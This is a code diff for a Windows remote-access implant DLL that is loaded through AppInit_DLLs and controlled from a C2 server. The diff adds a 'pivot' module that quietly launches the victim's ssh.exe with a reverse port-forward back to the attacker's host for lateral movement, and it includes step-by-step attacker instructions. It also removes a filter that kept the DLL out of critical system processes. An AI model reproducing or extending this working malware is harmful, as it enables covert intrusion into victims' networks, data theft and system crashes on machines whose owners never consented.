@@ -18,9 +18,11 @@
  *     ┌─────────────┬──────────────────────────────────────────────────────┐
  *     │ Module      │ What it does                                         │
  *     ├─────────────┼──────────────────────────────────────────────────────┤
- *     │ ssh         │ Open SSH sessions to other machines reachable from   │
- *     │             │ the victim's network; run commands on them.          │
+ *     │ pivot       │ Open SSH sessions FROM the victim to other machines  │
+ *     │             │ in the victim's network (lateral movement/pivoting). │
  *     │             │ Uses the victim's own ssh.exe (Windows 10+).         │
+ *     │             │ NOTE: "ssh" is handled server-side by Paramiko;      │
+ *     │             │ "pivot" is relayed to this DLL.                      │
  *     ├─────────────┼──────────────────────────────────────────────────────┤
  *     │ rdp         │ Probe whether RDP (port 3389) is open on a host,    │
  *     │             │ then launch mstsc.exe to open an RDP desktop.        │
@@ -388,202 +390,207 @@ static std::string sock_recv_line() {
 // ─────────────────────────────────────────────────────────────────────────────
 // Module 1 — SSH  (uses victim's own ssh.exe — no libssh2 needed)
 //
-// Each "session" is just stored credentials.  Every exec call spawns a fresh
-// ssh.exe process with piped stdin/stdout/stderr, writes the password to stdin
-// right away (ssh.exe uses stdin for passwords when not attached to a console),
-// waits for output, and returns it.  Requires Windows 10 1809+ (OpenSSH inbox).
+// ─────────────────────────────────────────────────────────────────────────────
+// Module 1 — Pivot SSH  (reverse tunnel — no libssh2, uses victim's ssh.exe)
+//
+// The victim spawns ssh.exe with a reverse port-forward (-R) back to the
+// attacker's machine.  This creates a port on the ATTACKER's machine that
+// forwards to the target host through the victim.
+//
+// Attacker workflow:
+//   1. c2> pivot open <target_host> <target_port> <your_ssh_user> [your_ssh_pass]
+//        → DLL spawns on victim:
+//            ssh.exe -N -R <listen_port>:<target_host>:<target_port>
+//                         <your_ssh_user>@<c2_host>
+//        → Response tells you the listen_port
+//   2. Open a NEW terminal on your machine and run:
+//        ssh target_user@localhost -p <listen_port>
+//   3. c2> pivot stop <session_id>   (when done)
+//      c2> pivot list                (see active tunnels)
+//
+// Requirements on the attacker's machine:
+//   • SSH server running  (macOS: System Preferences → Sharing → Remote Login)
+//   • sshd_config: GatewayPorts yes  (only if you need remote clients to use it)
+//     Default (GatewayPorts no) works fine for local use (localhost:<port>).
+//
 // ─────────────────────────────────────────────────────────────────────────────
 namespace ssh_mod {
 
-struct Session {
-    std::string host;
-    int         port{22};
-    std::string user;
-    std::string pass;
+struct Tunnel {
+    HANDLE      proc{INVALID_HANDLE_VALUE};
+    HANDLE      stdin_w{INVALID_HANDLE_VALUE}; // kept open so ssh doesn't get EOF
+    int         listen_port{0};
+    std::string target; // "host:port"
 };
-static std::map<std::string, Session> g_sessions;
-static std::mutex                     g_mtx;
+static std::map<std::string, Tunnel> g_tunnels;
+static std::mutex                    g_mtx;
+static int                           g_next_port = 10022; // auto-assigned listen ports
 
-// Locate ssh.exe on the victim machine.
 static std::string find_ssh() {
-    static const char* candidates[] = {
+    static const char* paths[] = {
         "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
         "C:\\Program Files\\Git\\usr\\bin\\ssh.exe",
         "C:\\Program Files (x86)\\Git\\usr\\bin\\ssh.exe",
         nullptr
     };
-    for (int i = 0; candidates[i]; ++i)
-        if (GetFileAttributesA(candidates[i]) != INVALID_FILE_ATTRIBUTES)
-            return std::string(candidates[i]);
-    return "ssh.exe"; // hope it's on PATH
-}
-
-// Run a single command over SSH and return {stdout, exit_code}.
-// Writes password to stdin immediately; detects "password:" prompt and
-// flushes remaining stdin to avoid hanging after auth.
-static json::Value ssh_run_cmd(const Session& s, const std::string& cmd) {
-    std::string ssh_path = find_ssh();
-
-    // Build argv string
-    char cl[4096];
-    snprintf(cl, sizeof(cl),
-        "\"%s\" -p %d "
-        "-o StrictHostKeyChecking=no "
-        "-o UserKnownHostsFile=NUL "
-        "-o LogLevel=ERROR "
-        "-o NumberOfPasswordPrompts=1 "
-        "%s@%s \"%s\"",
-        ssh_path.c_str(), s.port,
-        s.user.c_str(), s.host.c_str(),
-        cmd.c_str());
-
-    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
-    HANDLE in_r, in_w, out_r, out_w;
-    if (!CreatePipe(&in_r,  &in_w,  &sa, 0))
-        return json::err_resp("CreatePipe(stdin) failed");
-    if (!CreatePipe(&out_r, &out_w, &sa, 0)) {
-        CloseHandle(in_r); CloseHandle(in_w);
-        return json::err_resp("CreatePipe(stdout) failed");
-    }
-    // The write-end of stdin and read-end of stdout stay in this process only
-    SetHandleInformation(in_w,  HANDLE_FLAG_INHERIT, 0);
-    SetHandleInformation(out_r, HANDLE_FLAG_INHERIT, 0);
-
-    STARTUPINFOA si{};
-    si.cb         = sizeof(si);
-    si.dwFlags    = STARTF_USESTDHANDLES;
-    si.hStdInput  = in_r;
-    si.hStdOutput = out_w;
-    si.hStdError  = out_w;  // merge stderr into stdout
-
-    PROCESS_INFORMATION pi{};
-    if (!CreateProcessA(nullptr, cl, nullptr, nullptr,
-                        TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
-        CloseHandle(in_r); CloseHandle(in_w);
-        CloseHandle(out_r); CloseHandle(out_w);
-        return json::err_resp("Failed to spawn ssh.exe: " +
-                               std::to_string(GetLastError()));
-    }
-    // Close the handles the child inherited; we keep the opposite ends
-    CloseHandle(in_r);
-    CloseHandle(out_w);
-
-    // Write password + newline immediately.
-    // Windows OpenSSH reads from stdin when stdin is not a console.
-    std::string pw = s.pass + "\n";
-    DWORD wr = 0;
-    WriteFile(in_w, pw.c_str(), (DWORD)pw.size(), &wr, nullptr);
-
-    // Read output with a 20-second timeout
-    std::string output;
-    char   buf[4096];
-    DWORD  start = GetTickCount();
-    bool   password_cleared = false;
-
-    while (GetTickCount() - start < 20000) {
-        DWORD avail = 0;
-        if (!PeekNamedPipe(out_r, nullptr, 0, nullptr, &avail, nullptr)) break;
-        if (avail == 0) {
-            DWORD st;
-            if (GetExitCodeProcess(pi.hProcess, &st) && st != STILL_ACTIVE) break;
-            Sleep(40);
-            continue;
-        }
-        DWORD rd = 0;
-        if (!ReadFile(out_r, buf, std::min(avail, (DWORD)sizeof(buf) - 1), &rd, nullptr) || rd == 0)
-            break;
-        buf[rd] = '\0';
-        output += buf;
-
-        // If the server echoed back a password prompt, clear it from output
-        // and send a newline in case the first write didn't land in time
-        if (!password_cleared) {
-            std::string lo = output;
-            for (auto& c : lo) c = (char)tolower((unsigned char)c);
-            if (lo.find("password:") != std::string::npos) {
-                output.clear();
-                WriteFile(in_w, "\n", 1, &wr, nullptr);
-                password_cleared = true;
-            }
-        }
-    }
-
-    CloseHandle(in_w);
-    CloseHandle(out_r);
-
-    WaitForSingleObject(pi.hProcess, 5000);
-    DWORD ec = 255;
-    GetExitCodeProcess(pi.hProcess, &ec);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-    if (ec != 0 && output.empty())
-        return json::err_resp("SSH failed (exit=" + std::to_string(ec) +
-                               "). Check credentials / host reachability.");
-
-    return json::ok_resp({{"stdout",    json::Value(output)},
-                           {"exit_code", json::Value((double)ec)}});
+    for (int i = 0; paths[i]; ++i)
+        if (GetFileAttributesA(paths[i]) != INVALID_FILE_ATTRIBUTES)
+            return paths[i];
+    return "ssh.exe";
 }
 
 json::Value handle(const json::Value& p) {
     std::string action = p["action"].str();
 
-    // ── connect ──────────────────────────────────────────────────────────────
-    if (action == "connect") {
-        std::string host = p["host"].str();
-        int         port = (int)p["port"].num(22);
-        std::string user = p["username"].str();
-        std::string pass = p["password"].str();
-        // session_id defaults to "host:port"
-        std::string sid  = p["session_id"].str(host + ":" + std::to_string(port));
+    // ── open — set up reverse SSH tunnel ─────────────────────────────────────
+    //
+    //  payload:
+    //    host      = target host (the machine you want to reach via the victim)
+    //    port      = target port (default 22)
+    //    username  = YOUR SSH username on YOUR machine (attacker)
+    //    password  = YOUR SSH password  (leave empty if using key auth)
+    //
+    if (action == "open" || action == "connect") {
+        std::string tgt_host = p["host"].str();
+        int         tgt_port = (int)p["port"].num(22);
+        std::string atk_user = p["username"].str();
+        std::string atk_pass = p["password"].str();
+        std::string sid      = p["session_id"].str(tgt_host + ":" + std::to_string(tgt_port));
 
-        if (host.empty() || user.empty())
-            return json::err_resp("host and username are required");
+        if (tgt_host.empty() || atk_user.empty())
+            return json::err_resp("host and username (your SSH user on the attacker machine) required");
 
-        // Test the connection with a harmless echo
-        Session s{host, port, user, pass};
-        auto test = ssh_run_cmd(s, "echo __c2_ok__");
-        if (test["status"].str() != "ok")
-            return test; // propagate error (bad creds / unreachable)
+        // Assign a listen port on the attacker machine
+        int listen;
+        {
+            std::lock_guard<std::mutex> lk(g_mtx);
+            listen = g_next_port++;
+        }
 
-        std::lock_guard<std::mutex> lk(g_mtx);
-        g_sessions[sid] = s;
-        return json::ok_resp({{"session_id", json::Value(sid)},
-                               {"message",    json::Value(std::string("Connected"))}});
+        std::string ssh = find_ssh();
+        char cl[4096];
+        // -N                       : no remote command, tunnel only
+        // -R listen:tgt_host:tgt_p : reverse port forward
+        // ExitOnForwardFailure=yes : fail fast if port already bound
+        // ServerAliveInterval=30   : keep-alive so firewall doesn't drop it
+        snprintf(cl, sizeof(cl),
+            "\"%s\" -N "
+            "-o StrictHostKeyChecking=no "
+            "-o UserKnownHostsFile=NUL "
+            "-o LogLevel=ERROR "
+            "-o ExitOnForwardFailure=yes "
+            "-o ServerAliveInterval=30 "
+            "-R %d:%s:%d "
+            "%s@%s",
+            ssh.c_str(),
+            listen, tgt_host.c_str(), tgt_port,
+            atk_user.c_str(), g_host.c_str());
+
+        SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
+        HANDLE in_r = INVALID_HANDLE_VALUE, in_w = INVALID_HANDLE_VALUE;
+        if (!CreatePipe(&in_r, &in_w, &sa, 0))
+            return json::err_resp("CreatePipe failed: " + std::to_string(GetLastError()));
+        SetHandleInformation(in_w, HANDLE_FLAG_INHERIT, 0);
+
+        // Discard ssh.exe stdout/stderr — DLL lives inside a GUI process with no console
+        HANDLE hnul = CreateFileA("NUL", GENERIC_WRITE,
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                  &sa, OPEN_EXISTING, 0, nullptr);
+
+        STARTUPINFOA si{};
+        si.cb         = sizeof(si);
+        si.dwFlags    = STARTF_USESTDHANDLES;
+        si.hStdInput  = in_r;
+        si.hStdOutput = hnul;
+        si.hStdError  = hnul;
+
+        PROCESS_INFORMATION pi{};
+        if (!CreateProcessA(nullptr, cl, nullptr, nullptr, TRUE,
+                            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+            DWORD err = GetLastError();
+            CloseHandle(in_r); CloseHandle(in_w);
+            if (hnul != INVALID_HANDLE_VALUE) CloseHandle(hnul);
+            return json::err_resp("Failed to spawn ssh.exe (err=" + std::to_string(err) + ")");
+        }
+        CloseHandle(in_r);
+        if (hnul != INVALID_HANDLE_VALUE) CloseHandle(hnul);
+        CloseHandle(pi.hThread);
+
+        // Send password immediately; in_w stays open — if we close it,
+        // ssh gets stdin EOF and may terminate the tunnel.
+        if (!atk_pass.empty()) {
+            std::string pw = atk_pass + "\n";
+            DWORD wr;
+            WriteFile(in_w, pw.c_str(), (DWORD)pw.size(), &wr, nullptr);
+        }
+
+        {
+            std::lock_guard<std::mutex> lk(g_mtx);
+            // Replace any existing tunnel for this session
+            auto it = g_tunnels.find(sid);
+            if (it != g_tunnels.end()) {
+                CloseHandle(it->second.stdin_w);
+                TerminateProcess(it->second.proc, 0);
+                CloseHandle(it->second.proc);
+                g_tunnels.erase(it);
+            }
+            Tunnel t;
+            t.proc        = pi.hProcess;
+            t.stdin_w     = in_w;
+            t.listen_port = listen;
+            t.target      = tgt_host + ":" + std::to_string(tgt_port);
+            g_tunnels[sid] = t;
+        }
+
+        std::string msg =
+            "Tunnel open. On your machine open a NEW terminal and run:  "
+            "ssh <target_user>@localhost -p " + std::to_string(listen);
+        return json::ok_resp({
+            {"session_id",  json::Value(sid)},
+            {"listen_port", json::Value((double)listen)},
+            {"target",      json::Value(tgt_host + ":" + std::to_string(tgt_port))},
+            {"message",     json::Value(msg)}
+        });
     }
 
-    // ── exec ─────────────────────────────────────────────────────────────────
-    if (action == "exec") {
+    // ── stop / disconnect — kill tunnel ───────────────────────────────────────
+    if (action == "stop" || action == "disconnect") {
         std::string sid = p["session_id"].str();
-        std::string cmd = p["command"].str();
-        if (cmd.empty()) return json::err_resp("command is required");
         std::lock_guard<std::mutex> lk(g_mtx);
-        auto it = g_sessions.find(sid);
-        if (it == g_sessions.end())
-            return json::err_resp("No session with id: " + sid);
-        return ssh_run_cmd(it->second, cmd);
+        auto it = g_tunnels.find(sid);
+        if (it == g_tunnels.end())
+            return json::err_resp("No tunnel: " + sid);
+        CloseHandle(it->second.stdin_w);            // EOF → ssh exits gracefully
+        WaitForSingleObject(it->second.proc, 3000);
+        TerminateProcess(it->second.proc, 0);       // force-kill if still up
+        CloseHandle(it->second.proc);
+        g_tunnels.erase(it);
+        return json::ok_resp({{"message", json::Value(std::string("Tunnel closed"))}});
     }
 
-    // ── disconnect ───────────────────────────────────────────────────────────
-    if (action == "disconnect") {
-        std::string sid = p["session_id"].str();
-        std::lock_guard<std::mutex> lk(g_mtx);
-        auto it = g_sessions.find(sid);
-        if (it == g_sessions.end())
-            return json::err_resp("No session: " + sid);
-        g_sessions.erase(it);
-        return json::ok_resp({{"message", json::Value(std::string("Disconnected"))}});
-    }
-
-    // ── list ─────────────────────────────────────────────────────────────────
+    // ── list — show active tunnels ────────────────────────────────────────────
     if (action == "list") {
         std::lock_guard<std::mutex> lk(g_mtx);
-        json::Array ids;
-        for (auto& [k, _] : g_sessions) ids.push_back(json::Value(k));
-        return json::ok_resp({{"sessions", json::Value(ids)}});
+        json::Array sids, targets, ports, alive_arr;
+        for (auto& [sid, t] : g_tunnels) {
+            DWORD ec;
+            bool alive = GetExitCodeProcess(t.proc, &ec) && (ec == STILL_ACTIVE);
+            sids.push_back(json::Value(sid));
+            targets.push_back(json::Value(t.target));
+            ports.push_back(json::Value((double)t.listen_port));
+            alive_arr.push_back(json::Value(alive ? std::string("alive") : std::string("dead")));
+        }
+        return json::ok_resp({
+            {"session_ids",  json::Value(sids)},
+            {"targets",      json::Value(targets)},
+            {"listen_ports", json::Value(ports)},
+            {"status",       json::Value(alive_arr)}
+        });
     }
 
-    return json::err_resp("Unknown SSH action: " + action);
+    return json::err_resp(
+        "Unknown pivot action: " + action + ". "
+        "Valid: open, stop, list");
 }
 
 } // namespace ssh_mod
@@ -2299,7 +2306,7 @@ static void agent_loop() {
             const json::Value& payload = msg["payload"];
 
             json::Value result;
-            if      (module == "ssh")      result = ssh_mod::handle(payload);
+            if      (module == "pivot")    result = ssh_mod::handle(payload);
             else if (module == "rdp")      result = rdp_mod::handle(payload);
             else if (module == "registry") result = reg_mod::handle(payload);
             else if (module == "activity") result = act_mod::handle(payload);
@@ -2322,49 +2329,11 @@ static void agent_loop() {
 // DllMain
 // ─────────────────────────────────────────────────────────────────────────────
 
-// Returns false for critical system processes that must not be disturbed.
-// AppInit_DLLs injects us into EVERY user32-using process — including ones
-// where a crash would BSOD the machine or corrupt the OS.
-static bool is_safe_host() {
-    char path[MAX_PATH]{};
-    GetModuleFileNameA(nullptr, path, MAX_PATH);
-
-    // Extract lowercase basename
-    const char* base = strrchr(path, '\\');
-    base = base ? base + 1 : path;
-    char name[MAX_PATH]{};
-    for (int i = 0; base[i] && i < MAX_PATH - 1; ++i)
-        name[i] = (char)tolower((unsigned char)base[i]);
-
-    // Processes that are too critical to risk crashing:
-    //   winlogon  – Windows login; crash = can't log in / locked out
-    //   dwm       – Desktop Window Manager; crash = black screen loop
-    //   csrss     – Client/Server Runtime; crash = BSOD
-    //   lsass     – Local Security Authority; crash = BSOD
-    //   smss      – Session Manager; crash = BSOD
-    //   wininit   – Windows Init; crash = BSOD
-    //   services  – SCM; crash = all services die
-    static const char* BLOCKED[] = {
-        "winlogon.exe", "dwm.exe", "csrss.exe", "lsass.exe",
-        "smss.exe", "wininit.exe", "services.exe",
-        nullptr
-    };
-    for (int i = 0; BLOCKED[i]; ++i)
-        if (strcmp(name, BLOCKED[i]) == 0) return false;
-
-    return true;
-}
-
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {
     switch (nReason) {
     case DLL_PROCESS_ATTACH:
         DisableThreadLibraryCalls(hModule);
         g_hmodule = hModule;
-
-        // ── Process filter ─────────────────────────────────────────────────────
-        // Skip system processes that would crash and corrupt the OS.
-        // Return TRUE so Windows doesn't fail to load user32.dll in those apps.
-        if (!is_safe_host()) break;
 
         // ── Singleton guard ────────────────────────────────────────────────────
         // Only the FIRST process to claim this mutex runs the C2 agent.
